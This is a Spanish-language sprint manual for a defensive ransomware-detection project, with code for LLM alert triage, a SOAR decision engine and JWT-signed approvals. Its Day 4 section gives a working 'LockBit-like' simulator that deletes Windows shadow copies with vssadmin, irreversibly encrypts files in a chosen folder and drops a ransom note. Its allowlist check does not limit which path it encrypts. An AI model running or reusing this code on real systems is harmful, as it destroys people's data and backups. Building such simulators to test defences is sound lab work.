# Sprint Semana 1 — Manual de P1 (Enzo Ordoñez Flores)

| Field | Value |
|-------|-------|
| Owner | Enzo Ordoñez Flores |
| Rol | P1 · Líder · LLM/SOAR · Coordinación |
| Goal de la semana | Capa 4 LLM Triage + SOAR Decision Engine + Approval API + multi-channel notifications + Streamlit Approval Console + simulador de ransomware ejecutable. Entregable: UC-01 + UC-02 + UC-04 corriendo end-to-end al domingo. |
| Effort estimado | 6 horas reales de trabajo por día durante 7 días = 42 horas |
| Pre-requisito | Haber leído `docs/team/sprint-week-1-overview.md` |

---

## Antes de empezar — chequeo de prerequisitos

Antes del Día 1, asegúrate de tener esto listo. Si te falta algo, el Día 1 se va a pasar peleando con setup y vas a estar atrás todo el sprint.

### Hardware

- Laptop con **mínimo 16 GB de RAM** (Llama 3.1 8B + servicios Python + IDE + browser fácilmente comen 12 GB).
- **40 GB de disco libre**.
- macOS / Linux nativo / Windows con WSL2.

### Software base (instalar antes del Día 1)

```bash
# Python 3.11+ — verifica con
python3 --version    # debe decir 3.11.x o 3.12.x

# Git configurado
git config --global user.name "Enzo Ordoñez Flores"
git config --global user.email "enzizoordonezflores@gmail.com"

# Una terminal moderna (Windows Terminal / iTerm2)
# IDE: VSCode con extensiones Python, Pylance, Ruff
```

### Cuentas externas (60-90 minutos en total)

| Servicio | Cómo crear | Lo que necesitas guardar |
|----------|------------|--------------------------|
| **OpenAI** | https://platform.openai.com/signup → Settings → Billing → agregar tarjeta → Settings → Limits → set "Monthly budget" = $20 USD | `OPENAI_API_KEY` que generes en API Keys |
| **Telegram Bot** | App Telegram → chat con `@BotFather` → comando `/newbot` → seguir wizard | `TELEGRAM_BOT_TOKEN` |
| **Discord Webhook** | Server del equipo → Server Settings → Integrations → Webhooks → New Webhook → Copy URL | `DISCORD_WEBHOOK_URL` |
| **Twilio** | https://www.twilio.com/try-twilio → registrarse trial → Console muestra Account SID + Auth Token | `TWILIO_ACCOUNT_SID`, `TWILIO_AUTH_TOKEN`, `TWILIO_FROM_NUMBER` (el número que Twilio te asigna gratis) |

### Verificación pre-Día 1

```bash
python3 --version              # 3.11.x o 3.12.x
git --version                  # 2.30+
echo $OPENAI_API_KEY           # debe imprimir tu key (configurar en tu shell rc)
```

---

## Día 1 (Lunes) — Setup ambiente + skeletons

**Goal del día:** repositorio clonado, ambiente Python listo, Ollama corriendo Llama 3.1 8B, FastAPI `/triage` respondiendo con stub, OpenAIClient real funcional, primer commit/PR enviado.

**Tiempo estimado:** 5-6 horas.

### Paso 1.1 — Clonar repo y crear ambiente (15 min)

```bash
cd ~/projects                                    # o donde guardes proyectos
git clone https://github.com/EnzoOrdonez/argos.git
cd argos

# Crear y activar virtualenv
python3 -m venv .venv
source .venv/bin/activate                        # Linux/macOS
# .venv\Scripts\activate                         # Windows PowerShell

# Actualizar pip
pip install -U pip setuptools wheel

# Instalar el proyecto con extras de LLM, SOAR, y dev
pip install -e ".[llm,soar,dev]"
```

**Verificación:**
```bash
pytest argos_contracts/tests/ -v
# Esperado: 69 passed
```

Si pytest falla, NO sigas — revisa que el entorno virtual esté activado (`which python` debe apuntar a `.venv/bin/python`).

### Paso 1.2 — Configurar variables de entorno (10 min)

```bash
cp .env.example .env
```

Edita `.env` con tus valores reales:
- `OPENAI_API_KEY=sk-proj-...`
- `OPENAI_MODEL=gpt-4o-mini`
- `TELEGRAM_BOT_TOKEN=...`
- `TELEGRAM_APPROVER_CHAT_IDS=` (todavía vacío, lo llenarás cuando el bot reciba el primer /start)
- `DISCORD_WEBHOOK_URL=https://discord.com/api/webhooks/...`
- `TWILIO_ACCOUNT_SID=AC...`
- `TWILIO_AUTH_TOKEN=...`
- `TWILIO_FROM_NUMBER=+1...`
- `JWT_SECRET=` (generar con `openssl rand -hex 32`)
- `LLM_BACKEND=openai`

**No commitees el `.env`** — ya está en `.gitignore`. Si dudas:
```bash
git status                                       # .env NO debe aparecer
```

### Paso 1.3 — Instalar Ollama y descargar Llama 3.1 8B (20 min)

```bash
# macOS / Linux:
curl -fsSL https://ollama.com/install.sh | sh

# Windows: descargar instalador de https://ollama.com/download

# Verificar
ollama --version

# Descargar el modelo (~5 GB, toma 5-10 min según conexión)
ollama pull llama3.1:8b

# Verificar que arranca
ollama list                                      # debe mostrar llama3.1:8b
ollama run llama3.1:8b "Say hello in one word"   # debe responder
```

Ollama corre como servicio en `http://localhost:11434`. No necesitas iniciar nada manualmente después de instalarlo en macOS/Windows. En Linux puede que necesites:
```bash
systemctl --user start ollama   # o
ollama serve &                  # foreground
```

### Paso 1.4 — Crear branch de trabajo (2 min)

```bash
git checkout main
git pull origin main
git checkout -b feature/p1/llm-triage-skeleton
```

### Paso 1.5 — Implementar FastAPI /triage con stub (45 min)

Edita `llm_triage/api/main.py` (actualmente solo tiene docstring + TODOs). Reemplaza todo el contenido por:

```python
"""FastAPI service for ARGOS Layer 4 LLM Triage.

References:
    - SAD §7.1 (Block 06 — FastAPI service).
    - ADR-0001 v2 (LLMClient abstraction — OpenAI primary + Llama local fallback).
"""

from datetime import datetime, timezone
import logging
import os

from fastapi import FastAPI, HTTPException

from argos_contracts import AlertContext, Severity, TriageResponse

logger = logging.getLogger(__name__)

app = FastAPI(
    title="ARGOS LLM Triage",
    version="0.1.0",
    description="Layer 4 — LLM-based alert triage and enrichment",
)


@app.get("/health")
async def health() -> dict[str, str]:
    """External heartbeat per SAD §13.6."""
    return {"status": "ok", "backend": os.getenv("LLM_BACKEND", "openai")}


@app.post("/triage", response_model=TriageResponse)
async def triage(ctx: AlertContext) -> TriageResponse:
    """Triage an incident context. Returns structured TriageResponse.

    STUB implementation for Day 1. Replaced with OpenAIClient call on Day 2.
    """
    logger.info("Triage request for incident %s", ctx.incident_id)

    # Stub response — to be replaced with LLMClient call
    return TriageResponse(
        incident_id=ctx.incident_id,
        tecnica_mitre="T1486",
        confianza=0.50,
        severidad=Severity.MEDIUM,
        runbook_aplicable="NIST 800-61 §3.4 Containment (stub response)",
        accion_recomendada="STUB: replace with OpenAIClient call from Day 2 onwards",
        indicadores_correlacionar=[],
        llm_backend="stub",
        generated_at=datetime.now(timezone.utc),
    )
```

Levanta el servicio:
```bash
uvicorn llm_triage.api.main:app --host 0.0.0.0 --port 8002 --reload
```

**Verificación en otra terminal:**
```bash
# Health check
curl http://localhost:8002/health
# Esperado: {"status":"ok","backend":"openai"}

# Triage con payload válido
curl -X POST http://localhost:8002/triage \
  -H "Content-Type: application/json" \
  -d '{
    "incident_id": "INC-2026-05-26-001",
    "created_at": "2026-05-26T10:00:00Z",
    "host": {"id": "WIN-01", "criticality": "standard"},
    "alert_summary": {
      "title": "test alert",
      "severity_score": 0.5,
      "triggering_layers": ["layer_1"],
      "raw_alert_id": "test-1"
    }
  }'
# Esperado: TriageResponse JSON con stub data
```

Si el health responde 200 pero el triage responde 422, es validation error de Pydantic — verifica el JSON.

### Paso 1.6 — Implementar OpenAIClient real (1.5 horas)

Edita `llm_triage/llm_client/openai_client.py`:

```python
"""OpenAI GPT-4o-mini backend for LLMClient (primary per ADR-0001 v2)."""

import json
import os
from datetime import datetime, timezone

from openai import AsyncOpenAI

from argos_contracts import AlertContext, Severity, TriageResponse
from argos_contracts._mitre_data import MITRE_WHITELIST

SYSTEM_PROMPT = """You are a SOC tier-2 analyst at ARGOS.
You receive normalized ransomware alerts and must return STRICT JSON matching the schema below.

Rules:
- tecnica_mitre MUST be one of: {whitelist}
- confianza is a float 0.0–1.0
- severidad is one of: low, medium, high, critical
- runbook_aplicable cites NIST 800-61 or SANS section (text, min 10 chars)
- accion_recomendada is descriptive prose (min 20 chars)
- indicadores_correlacionar is a list of strings (IoCs)
- Output ONLY the JSON object, no markdown, no commentary.
"""


class OpenAIClient:
    def __init__(
        self,
        api_key: str | None = None,
        model: str = "gpt-4o-mini",
    ) -> None:
        self.client = AsyncOpenAI(
            api_key=api_key or os.getenv("OPENAI_API_KEY")
        )
        self.model = model

    async def analyze(self, ctx: AlertContext) -> TriageResponse:
        system_prompt = SYSTEM_PROMPT.format(
            whitelist=", ".join(sorted(MITRE_WHITELIST))
        )
        user_prompt = (
            f"Incident: {ctx.incident_id}\n"
            f"Host: {ctx.host.id} (criticality: {ctx.host.criticality.value})\n"
            f"Alert: {ctx.alert_summary.title}\n"
            f"Initial technique: {ctx.alert_summary.technique_mitre}\n"
            f"Severity score: {ctx.alert_summary.severity_score}\n"
            f"Triggering layers: {[l.value for l in ctx.alert_summary.triggering_layers]}\n"
        )

        response = await self.client.chat.completions.create(
            model=self.model,
            messages=[
                {"role": "system", "content": system_prompt},
                {"role": "user", "content": user_prompt},
            ],
            response_format={"type": "json_object"},
            temperature=0.2,
            max_tokens=400,
        )

        raw = response.choices[0].message.content or "{}"
        parsed = json.loads(raw)

        return TriageResponse(
            incident_id=ctx.incident_id,
            tecnica_mitre=parsed.get("tecnica_mitre", "T1486"),
            confianza=float(parsed.get("confianza", 0.5)),
            severidad=Severity(parsed.get("severidad", "medium")),
            runbook_aplicable=parsed.get(
                "runbook_aplicable", "NIST 800-61 §3.4 Containment"
            ),
            accion_recomendada=parsed.get(
                "accion_recomendada",
                "Investigate further with full forensic context",
            ),
            indicadores_correlacionar=parsed.get("indicadores_correlacionar", []),
            llm_backend="gpt-4o-mini",
            generated_at=datetime.now(timezone.utc),
        )
```

**Prueba directa** (script `tmp_test_openai.py` que NO commiteas):
```python
# tmp_test_openai.py
import asyncio
from datetime import datetime, timezone
from argos_contracts import AlertContext, AlertSummary, HostInfo, Criticality, Layer
from llm_triage.llm_client.openai_client import OpenAIClient

async def main():
    ctx = AlertContext(
        incident_id="INC-2026-05-26-001",
        created_at=datetime.now(timezone.utc),
        host=HostInfo(id="WIN-VICTIM-01", criticality=Criticality.STANDARD),
        alert_summary=AlertSummary(
            title="vssadmin delete shadows detected",
            technique_mitre="T1490",
            severity_score=0.92,
            triggering_layers=[Layer.LAYER_1, Layer.LAYER_2],
            raw_alert_id="wazuh-001",
        ),
    )
    client = OpenAIClient()
    resp = await client.analyze(ctx)
    print(resp.model_dump_json(indent=2))

asyncio.run(main())
```

```bash
python tmp_test_openai.py
# Esperado: JSON con TriageResponse válido, técnica T1490 o similar, confianza alta
rm tmp_test_openai.py
```

Si OpenAI te tira 401, verifica `OPENAI_API_KEY` está exportado en tu shell o cargado desde `.env`.

### Paso 1.7 — Probar bot Telegram (15 min)

Crea un script `tmp_test_telegram.py`:
```python
import asyncio
import os
from telegram import Bot

async def main():
    bot = Bot(token=os.environ["TELEGRAM_BOT_TOKEN"])
    me = await bot.get_me()
    print(f"Bot username: @{me.username}")
    # Para enviar mensaje, primero abre tu Telegram, busca el bot, envíale "/start"
    # Luego ejecuta este script con tu chat_id

asyncio.run(main())
```

```bash
pip install python-telegram-bot
python tmp_test_telegram.py
# Esperado: Bot username: @ArgosBot (o el nombre que le diste)
```

Para obtener tu chat_id: en Telegram envía cualquier mensaje al bot, luego:
```bash
curl "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/getUpdates" | jq '.result[0].message.chat.id'
```

Guarda ese ID en `.env` → `TELEGRAM_APPROVER_CHAT_IDS=123456789`. Cuando todos los aprobadores envíen `/start`, repite para cada uno y separa por comas.

### Paso 1.8 — Probar Discord webhook (10 min)

```bash
curl -X POST $DISCORD_WEBHOOK_URL \
  -H "Content-Type: application/json" \
  -d '{"content":"🛡 ARGOS Day 1 setup — Discord webhook funcionando"}'
```

Verifica que el mensaje aparezca en el canal de Discord configurado.

### Paso 1.9 — Commit + PR (10 min)

```bash
git add llm_triage/api/main.py llm_triage/llm_client/openai_client.py
git status                                       # verifica que .env NO aparece
git commit -m "feat(p1): /triage endpoint stub + OpenAIClient real + Ollama setup"
git push origin feature/p1/llm-triage-skeleton
```

Abre PR en GitHub con título: `[P1 Day 1] LLM triage skeleton + OpenAI client funcional`. Pon a P2 como reviewer (par P1↔P2).

### Verificación EOD Día 1

Antes de cerrar el día, confirma:

- [ ] `pytest argos_contracts/tests/` pasa 69 tests
- [ ] `curl http://localhost:8002/health` responde 200
- [ ] `curl -X POST http://localhost:8002/triage ...` responde TriageResponse válido
- [ ] OpenAIClient devuelve respuesta real cuando lo invocas
- [ ] Telegram bot existe y `getMe` responde
- [ ] Discord webhook recibe mensaje de prueba
- [ ] Ollama corre y `ollama run llama3.1:8b` responde
- [ ] PR abierto en GitHub

### Bloqueos comunes Día 1

| Problema | Causa probable | Fix |
|----------|----------------|-----|
| `pip install` falla con `Building wheel ... failed` | Falta compilador C | macOS: `xcode-select --install`. Ubuntu: `apt install build-essential python3-dev`. Windows: usar WSL2 |
| `ImportError: No module named argos_contracts` | venv no activado o pip install -e no se ejecutó | `source .venv/bin/activate && pip install -e ".[llm,soar,dev]"` |
| OpenAI 401 Unauthorized | `OPENAI_API_KEY` no cargada | Exportar en shell: `export OPENAI_API_KEY=sk-...` o usar `python-dotenv` para cargar `.env` |
| OpenAI 429 rate limit | Cuenta sin créditos | Verificar en https://platform.openai.com/account/billing/overview |
| Ollama "model not found" | Modelo no descargado | `ollama pull llama3.1:8b` |
| Telegram `Unauthorized` | Token mal copiado | Re-generar con `@BotFather` con `/token` |

---

## Día 2 (Martes) — SOAR Decision Engine + LlamaLocalClient

**Goal del día:** Tier Classifier funcional con synthetic alerts, máquina de estados Redis básica, LlamaLocalClient operacional como fallback.

**Tiempo estimado:** 6 horas.

### Paso 2.1 — Crear estructura del SOAR (15 min)

```bash
cd ~/projects/argos
mkdir -p soar/decision_engine soar/approval soar/notification soar/playbooks soar/tests
touch soar/__init__.py soar/decision_engine/__init__.py soar/approval/__init__.py
touch soar/notification/__init__.py soar/playbooks/__init__.py soar/tests/__init__.py
```

### Paso 2.2 — Implementar Tier Classifier (1.5 horas)

`soar/decision_engine/tier_classifier.py`:

```python
"""Tier classifier per ADR-0003 §"Lógica de ejecución por tier".

Reads layer signals (NormalizedAlert + optional MLScore + canary signal)
and returns a Tier (T0..T3). Threshold values are preliminary per Q5.
"""

from argos_contracts import (
    Layer,
    MLScore,
    NormalizedAlert,
    Tier,
)


# Preliminary thresholds — Q5 calibration pending
T0_THRESHOLD = 0.95
T1_THRESHOLD = 0.80
T2_THRESHOLD = 0.60
T3_THRESHOLD = 0.40


def classify(
    alerts: list[NormalizedAlert],
    ml_score: MLScore | None = None,
    canary_fired: bool = False,
) -> Tier:
    """Apply fusion rules from SAD §6.2.

    Args:
        alerts: NormalizedAlerts that fired in current incident window.
        ml_score: Optional MLScore from Layer 2.
        canary_fired: Whether Layer 3 (canary) was touched.

    Returns:
        Tier enum value.
    """
    layers = {a.source_layer for a in alerts}

    # Layer 3 (canary) wins to T0 in any combination
    if canary_fired:
        return Tier.T0

    has_l1 = Layer.LAYER_1 in layers
    has_l2 = ml_score is not None and ml_score.ensemble_score >= T1_THRESHOLD

    # L1 + L2 corroborate (no canary) → T1
    if has_l1 and has_l2:
        return Tier.T1

    # Single layer with high score → T2
    if has_l1 and not has_l2:
        # Need to check Sigma `level:` for high-fidelity vs experimental
        # For Day 2 we approximate by severity_score
        max_score = max(a.severity_score for a in alerts)
        if max_score >= T2_THRESHOLD:
            return Tier.T2
        return Tier.T3

    if has_l2 and not has_l1:
        if ml_score.ensemble_score >= T2_THRESHOLD:
            return Tier.T2
        if ml_score.ensemble_score >= T3_THRESHOLD:
            return Tier.T3

    return Tier.T3
```

Tests en `soar/tests/test_tier_classifier.py`:
```python
from datetime import datetime, timezone
import pytest
from argos_contracts import (
    Layer, MLScore, MLFeatures, NormalizedAlert, Severity, Tier,
)
from soar.decision_engine.tier_classifier import classify

UTC_NOW = datetime(2026, 5, 26, 10, 0, 0, tzinfo=timezone.utc)


def _alert(layer: Layer, score: float = 0.9) -> NormalizedAlert:
    return NormalizedAlert(
        alert_id="a1", source_layer=layer, timestamp=UTC_NOW,
        host_id="h1", severity_score=score, severity_label=Severity.HIGH,
    )


def _ml_score(score: float) -> MLScore:
    return MLScore(
        score_id="s1", timestamp=UTC_NOW, host_id="h1",
        isolation_forest_score=score, one_class_svm_score=score,
        ensemble_score=score,
        features=MLFeatures(
            file_write_rate=100, avg_entropy=7.0,
            extension_modification_ratio=0.5, crypto_api_calls=10,
            new_outbound_connections=2, cpu_burst_score=0.5,
            io_burst_score=0.5,
        ),
        model_version="v1",
    )


def test_canary_alone_is_t0():
    assert classify([_alert(Layer.LAYER_3)], canary_fired=True) == Tier.T0


def test_l1_and_l2_corroborate_is_t1():
    result = classify(
        [_alert(Layer.LAYER_1)],
        ml_score=_ml_score(0.85),
        canary_fired=False,
    )
    assert result == Tier.T1


def test_l1_alone_high_score_is_t2():
    result = classify([_alert(Layer.LAYER_1, score=0.75)], canary_fired=False)
    assert result == Tier.T2


def test_l2_alone_medium_score_is_t3():
    result = classify(
        [_alert(Layer.LAYER_2, score=0.5)],
        ml_score=_ml_score(0.55),
        canary_fired=False,
    )
    assert result == Tier.T3
```

Correr:
```bash
pytest soar/tests/ -v
# Esperado: 4 passed
```

### Paso 2.3 — Implementar LlamaLocalClient (1 hora)

`llm_triage/llm_client/llama_local.py`:
```python
"""Llama 3.1 8B local via Ollama. Fallback per ADR-0001 v2 — zero egress."""

import json
import os
from datetime import datetime, timezone

import httpx

from argos_contracts import AlertContext, Severity, TriageResponse
from argos_contracts._mitre_data import MITRE_WHITELIST


SYSTEM_PROMPT = (
    "You are a SOC analyst. Return STRICT JSON with these fields:\n"
    "tecnica_mitre (must be in MITRE list), confianza (0-1), "
    "severidad (low/medium/high/critical), runbook_aplicable, "
    "accion_recomendada, indicadores_correlacionar (list).\n"
    "Output ONLY JSON, no markdown."
)


class LlamaLocalClient:
    def __init__(
        self,
        base_url: str | None = None,
        model: str = "llama3.1:8b",
    ) -> None:
        self.base_url = base_url or os.getenv(
            "OLLAMA_BASE_URL", "http://localhost:11434"
        )
        self.model = model

    async def analyze(self, ctx: AlertContext) -> TriageResponse:
        prompt = (
            f"{SYSTEM_PROMPT}\n\n"
            f"Allowed MITRE techniques: {sorted(MITRE_WHITELIST)}\n\n"
            f"Alert: {ctx.alert_summary.title}\n"
            f"Host: {ctx.host.id}\n"
            f"Severity score: {ctx.alert_summary.severity_score}\n"
        )

        async with httpx.AsyncClient(timeout=30.0) as client:
            r = await client.post(
                f"{self.base_url}/api/generate",
                json={
                    "model": self.model,
                    "prompt": prompt,
                    "format": "json",
                    "stream": False,
                },
            )
            r.raise_for_status()
            data = r.json()
            parsed = json.loads(data["response"])

        return TriageResponse(
            incident_id=ctx.incident_id,
            tecnica_mitre=parsed.get("tecnica_mitre", "T1486"),
            confianza=float(parsed.get("confianza", 0.5)),
            severidad=Severity(parsed.get("severidad", "medium")),
            runbook_aplicable=parsed.get(
                "runbook_aplicable", "NIST 800-61 §3.4 Containment"
            ),
            accion_recomendada=parsed.get(
                "accion_recomendada",
                "Local LLM analysis — investigate further",
            ),
            indicadores_correlacionar=parsed.get("indicadores_correlacionar", []),
            llm_backend="llama-3.1-8b-local",
            generated_at=datetime.now(timezone.utc),
        )
```

### Paso 2.4 — Factory que escoge backend (15 min)

`llm_triage/llm_client/factory.py`:
```python
"""Factory per ADR-0001 v2."""
import os
from llm_triage.llm_client.openai_client import OpenAIClient
from llm_triage.llm_client.llama_local import LlamaLocalClient


def get_llm_client():
    backend = os.getenv("LLM_BACKEND", "openai")
    if backend == "openai":
        return OpenAIClient()
    if backend == "llama_local":
        return LlamaLocalClient()
    raise ValueError(f"Unknown LLM_BACKEND: {backend}")
```

Conecta la factory al endpoint `/triage` en `llm_triage/api/main.py` (reemplaza el stub):
```python
from llm_triage.llm_client.factory import get_llm_client

# ... en el endpoint:
@app.post("/triage", response_model=TriageResponse)
async def triage(ctx: AlertContext) -> TriageResponse:
    client = get_llm_client()
    return await client.analyze(ctx)
```

**Verificación:** prueba ambos backends.
```bash
# Backend openai
LLM_BACKEND=openai uvicorn llm_triage.api.main:app --reload --port 8002 &
sleep 2
curl -X POST http://localhost:8002/triage -H "Content-Type: application/json" -d @sample_alert.json
# kill el uvicorn

# Backend llama_local
LLM_BACKEND=llama_local uvicorn llm_triage.api.main:app --reload --port 8002 &
sleep 2
curl -X POST http://localhost:8002/triage -H "Content-Type: application/json" -d @sample_alert.json
```

Crea `sample_alert.json` antes con un AlertContext mock válido.

### Paso 2.5 — Setup Redis local + state machine básica (1.5 horas)

```bash
# macOS: brew install redis && brew services start redis
# Linux: sudo apt install redis-server && sudo systemctl start redis
# Windows: usar WSL2 o redis-stack docker

redis-cli ping
# Esperado: PONG
```

`soar/decision_engine/state_machine.py`:
```python
"""Incident state machine persisted in Redis."""

import json
import redis
from argos_contracts import Incident, IncidentState


class IncidentStateMachine:
    def __init__(self, redis_url: str = "redis://localhost:6379/0"):
        self.r = redis.from_url(redis_url, decode_responses=True)

    def save(self, incident: Incident) -> None:
        key = f"incident:{incident.incident_id}"
        self.r.set(key, incident.model_dump_json(), ex=86400)  # 24h TTL

    def load(self, incident_id: str) -> Incident | None:
        key = f"incident:{incident_id}"
        raw = self.r.get(key)
        if not raw:
            return None
        return Incident.model_validate_json(raw)

    def transition(self, incident_id: str, new_state: IncidentState) -> Incident:
        inc = self.load(incident_id)
        if inc is None:
            raise ValueError(f"Incident {incident_id} not found")
        inc.state = new_state
        self.save(inc)
        return inc
```

### Paso 2.6 — Commit + PR (10 min)

```bash
git add soar/ llm_triage/llm_client/llama_local.py llm_triage/llm_client/factory.py llm_triage/api/main.py
git commit -m "feat(p1): tier classifier + state machine Redis + LlamaLocalClient + factory"
git push origin feature/p1/llm-triage-skeleton
```

### Verificación EOD Día 2

- [ ] `pytest soar/tests/ -v` pasa los 4 tests de tier classifier
- [ ] `curl /triage` con `LLM_BACKEND=openai` devuelve análisis OpenAI real
- [ ] `curl /triage` con `LLM_BACKEND=llama_local` devuelve análisis Llama local
- [ ] Redis acepta `set`/`get` de un Incident serializado
- [ ] PR actualizado con commits del día

---

## Día 3 (Miércoles) — Approval API + JWT signing

**Goal del día:** Approval API funcional con tokens JWT, consolidation window de 60s, conservative-wins policy.

**Tiempo estimado:** 6 horas.

### Paso 3.1 — JWT signer (1 hora)

`soar/approval/jwt_signer.py`:
```python
"""JWT signing for approval tokens. HS256 + jti anti-replay per ADR-0006."""

import os
import uuid
from datetime import datetime, timedelta, timezone

import jwt


class JWTSigner:
    def __init__(self, secret: str | None = None, algorithm: str = "HS256"):
        self.secret = secret or os.environ["JWT_SECRET"]
        self.algorithm = algorithm

    def sign(self, incident_id: str, approver_email: str, ttl_minutes: int = 5) -> str:
        payload = {
            "incident_id": incident_id,
            "responder_email": approver_email,
            "jti": str(uuid.uuid4()),
            "iat": datetime.now(timezone.utc),
            "exp": datetime.now(timezone.utc) + timedelta(minutes=ttl_minutes),
        }
        return jwt.encode(payload, self.secret, algorithm=self.algorithm)

    def verify(self, token: str) -> dict:
        return jwt.decode(token, self.secret, algorithms=[self.algorithm])
```

Tests en `soar/tests/test_jwt.py`:
```python
import time
import pytest
import jwt
from soar.approval.jwt_signer import JWTSigner


def test_sign_and_verify_roundtrip():
    s = JWTSigner(secret="testsecret123")
    token = s.sign("INC-2026-05-26-001", "enzo@demo.local")
    payload = s.verify(token)
    assert payload["incident_id"] == "INC-2026-05-26-001"
    assert payload["responder_email"] == "enzo@demo.local"
    assert "jti" in payload


def test_expired_token_rejects():
    s = JWTSigner(secret="testsecret123")
    token = s.sign("INC-X", "x@y.local", ttl_minutes=0)  # already expired
    time.sleep(1)
    with pytest.raises(jwt.ExpiredSignatureError):
        s.verify(token)


def test_tampered_token_rejects():
    s = JWTSigner(secret="testsecret123")
    token = s.sign("INC-Y", "y@z.local") + "tampered"
    with pytest.raises(jwt.InvalidTokenError):
        s.verify(token)
```

### Paso 3.2 — Approval API (2 horas)

`soar/approval/api.py`:
```python
"""FastAPI Approval endpoint per ADR-0003."""

from datetime import datetime, timezone
from fastapi import FastAPI, HTTPException
from argos_contracts import ApprovalDecision, ApprovalResponse, NotificationChannelType
from soar.approval.jwt_signer import JWTSigner
from soar.decision_engine.state_machine import IncidentStateMachine


app = FastAPI(title="ARGOS Approval API")
signer = JWTSigner()
state = IncidentStateMachine()


@app.get("/health")
async def health():
    return {"status": "ok"}


@app.post("/approval/{token}")
async def approve(token: str, decision: ApprovalDecision):
    try:
        payload = signer.verify(token)
    except Exception as e:
        raise HTTPException(401, f"Invalid token: {e}")

    incident_id = payload["incident_id"]
    inc = state.load(incident_id)
    if inc is None:
        raise HTTPException(404, "Incident not found")

    # Append approver response
    response = ApprovalResponse(
        incident_id=incident_id,
        responder_email=payload["responder_email"],
        decision=decision,
        timestamp=datetime.now(timezone.utc),
        channel=NotificationChannelType.TELEGRAM,
        token_jti=payload["jti"],
    )

    # Apply conservative-wins (simplified for Day 3, full logic Day 4)
    # ... (extend on Day 4 with consolidation window)

    return {"status": "recorded", "decision": decision.value}
```

### Paso 3.3 — Conservative-wins consolidation (1.5 horas)

`soar/approval/consolidation.py`:
```python
"""Conservative-wins per ADR-0006 + 60s consolidation window."""

from argos_contracts import ApproverState, ApproverStatus, ConsolidationWindow


def resolve(approvers: list[ApproverState], window: ConsolidationWindow) -> str:
    """Apply conservative-wins.

    Returns:
        "EXECUTE_ISOLATION" if at least 1 approver said APPROVED.
        "NO_ACTION" if all said REJECTED or TIMEOUT.
    """
    approves = sum(1 for a in approvers if a.status == ApproverStatus.APPROVED)
    rejects = sum(1 for a in approvers if a.status == ApproverStatus.REJECTED)

    if approves == 0 and rejects == 0:
        return "NO_ACTION"  # all timeout

    # Conservative-wins: any approve beats any reject
    if approves >= 1:
        return "EXECUTE_ISOLATION"

    return "NO_ACTION"


def is_two_person_rule(host_criticality: str) -> bool:
    """Two-person rule activa si host es production-critical (Q2)."""
    return host_criticality == "production_critical"


def resolve_two_person(approvers: list[ApproverState]) -> str:
    """Two-person rule: requiere 2 approves antes de ejecutar."""
    approves = sum(1 for a in approvers if a.status == ApproverStatus.APPROVED)
    rejects = sum(1 for a in approvers if a.status == ApproverStatus.REJECTED)

    if rejects >= 1:
        return "NO_ACTION"  # any reject cancels
    if approves >= 2:
        return "EXECUTE_ISOLATION"
    return "PENDING_SECOND_APPROVAL"
```

Tests para los 3 escenarios principales.

### Paso 3.4 — Commit (10 min)

```bash
git add soar/approval/
git commit -m "feat(p1): JWT signer + approval API + conservative-wins + two-person rule"
git push
```

### Verificación EOD Día 3

- [ ] JWT firma y verifica roundtrip
- [ ] Token expirado rechaza
- [ ] Token tampered rechaza
- [ ] Approval API responde 200 con token válido
- [ ] Conservative-wins devuelve EXECUTE con 2 approves + 1 reject
- [ ] Two-person rule devuelve PENDING_SECOND con 1 approve solo
- [ ] PR actualizado

---

## Día 4 (Jueves) — Ransomware simulator + UC-01 attempt

**Goal del día:** simulador funcional, primer intento de UC-01 end-to-end con las piezas de P3 (Sigma rules) y P4 (lab).

**Tiempo estimado:** 6 horas.

### Paso 4.1 — Simulador LockBit-like (3 horas)

`attack-simulation/ransomware_simulator/lockbit_like.py`:
```python
"""LockBit-like ransomware simulator for UC-01.

SAFETY RAIL: only runs if target_ip is in lab/inventory.yaml allowlist.
"""

import argparse
import os
import sys
import time
from pathlib import Path
from cryptography.fernet import Fernet


SAFETY_ALLOWED_TARGETS = {"10.0.0.21", "10.0.0.22", "localhost", "127.0.0.1"}


def enumerate_files(root: Path) -> list[Path]:
    """T1083 — File and Directory Discovery."""
    return [p for p in root.rglob("*") if p.is_file()]


def delete_shadow_copies() -> None:
    """T1490 — Inhibit System Recovery."""
    if sys.platform == "win32":
        os.system("vssadmin delete shadows /all /quiet")
    else:
        print("[SIM] Linux equivalent: btrfs subvolume delete /backup/snapshots/*")


def encrypt_files(files: list[Path], key: bytes) -> int:
    """T1486 — Data Encrypted for Impact."""
    cipher = Fernet(key)
    encrypted = 0
    for f in files:
        try:
            data = f.read_bytes()
            f.write_bytes(cipher.encrypt(data))
            f.rename(f.with_suffix(f.suffix + ".locked"))
            encrypted += 1
        except (PermissionError, OSError):
            continue
    return encrypted


def drop_ransom_note(target_dir: Path) -> None:
    note = target_dir / "README_RESTORE_FILES.txt"
    note.write_text(
        "Your files have been encrypted (SIMULATION).\n"
        "This is a test of the ARGOS defensive system.\n"
        "No actual harm done.\n"
    )


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="localhost")
    parser.add_argument("--path", default=str(Path.home() / "Documents" / "argos_demo"))
    parser.add_argument("--dry-run", action="store_true")
    args = parser.parse_args()

    if args.target not in SAFETY_ALLOWED_TARGETS:
        print(f"REFUSED: target {args.target} not in allowlist {SAFETY_ALLOWED_TARGETS}")
        sys.exit(1)

    target_path = Path(args.path)
    if not target_path.exists():
        print(f"Target path {target_path} does not exist. Create it first.")
        sys.exit(1)

    if args.dry_run:
        print(f"[DRY RUN] Would attack {target_path}")
        print(f"[DRY RUN] Files to encrypt: {len(enumerate_files(target_path))}")
        return

    print(f"[T1083] Enumerating {target_path}...")
    files = enumerate_files(target_path)
    print(f"  Found {len(files)} files")

    time.sleep(1)

    print("[T1490] Deleting shadow copies...")
    delete_shadow_copies()

    time.sleep(1)

    print("[T1486] Encrypting...")
    key = Fernet.generate_key()
    n = encrypt_files(files, key)
    print(f"  Encrypted {n} files")

    drop_ransom_note(target_path)
    print("[SIM] Attack chain complete. Key (DISCARDED):", key.decode())


if __name__ == "__main__":
    main()
```

Probar dry-run:
```bash
mkdir -p ~/Documents/argos_demo
echo "test" > ~/Documents/argos_demo/test.txt
python attack-simulation/ransomware_simulator/lockbit_like.py --target localhost --dry-run
```

### Paso 4.2 — Integración con SOAR Decision Engine (2 horas)

Conecta los pedazos: cuando llegue una alerta de Wazuh por Redis stream, el SOAR la normaliza, clasifica el tier, opcionalmente pide enriquecimiento al LLM, y guarda Incident en Redis.

